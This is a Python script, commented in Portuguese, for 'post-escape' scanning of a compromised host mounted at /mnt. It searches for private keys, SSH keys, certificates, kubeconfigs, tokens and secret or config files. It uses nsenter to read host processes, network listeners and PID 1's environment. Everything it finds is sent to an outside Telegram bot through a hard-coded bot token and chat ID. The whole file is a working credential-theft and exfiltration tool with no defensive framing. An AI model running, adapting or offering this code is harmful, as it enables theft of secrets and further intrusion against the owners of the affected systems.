#!/usr/bin/env python3
"""
Pós-escape: varredura completa do host montado em /mnt.
"""

import subprocess
import json
import requests
import os
import re
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def send_file(filename, caption):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def search_files(base_path, patterns, max_depth=5):
    """Busca arquivos que correspondam a padrões (regex) dentro do host."""
    found = {}
    for root, dirs, files in os.walk(base_path):
        depth = root.replace(base_path, '').count(os.sep)
        if depth > max_depth:
            continue
        for file in files:
            full_path = os.path.join(root, file)
            for pattern, desc in patterns.items():
                if re.search(pattern, file):
                    try:
                        with open(full_path, 'r', errors='ignore') as f:
                            content = f.read(5000)
                        found[f"{desc} ({full_path})"] = content[:5000]
                    except:
                        pass
    return found

def main():
    send_telegram("🔍 **Iniciando varredura de arquivos sensíveis no host**")
    base = "/mnt"
    patterns = {
        r".*\.pem$|.*\.crt$|.*\.key$": "Certificado/Chave",
        r".*token$": "Token",
        r".*config$": "Config",
        r".*kubeconfig$": "Kubeconfig",
        r".*\.kube/.*": "Kube dir",
        r".*id_rsa$|.*id_dsa$": "Chave SSH",
        r".*\.json$|.*\.yaml$": "Config JSON/YAML",
        r".*secret.*": "Arquivo com 'secret'"
    }
    found = search_files(base, patterns)
    if found:
        for name, content in found.items():
            if len(content) > 4000:
                tmp = f"/tmp/{name.replace('/','_')}.txt"
                with open(tmp, "w") as f:
                    f.write(content)
                send_file(tmp, caption=f"📄 {name[:50]}")
                os.remove(tmp)
            else:
                send_telegram(f"📄 **{name}**\n```\n{content}\n```")
    else:
        send_telegram("❌ Nenhum arquivo sensível encontrado.")
    
    # Coletar processos e rede
    ps = run("nsenter -t 1 -m ps auxfww 2>/dev/null")
    netstat = run("nsenter -t 1 -n netstat -tulpn 2>/dev/null")
    env = run("nsenter -t 1 -m cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'")
    
    send_telegram(f"📄 **Processos do host**\n```\n{ps[:3000]}\n```")
    send_telegram(f"📄 **Conexões de rede**\n```\n{netstat[:3000]}\n```")
    send_telegram(f"📄 **Environ do host**\n```\n{env[:3000]}\n```")
    
    send_telegram("✅ **Varredura finalizada.**")

if __name__ == "__main__":
    main()
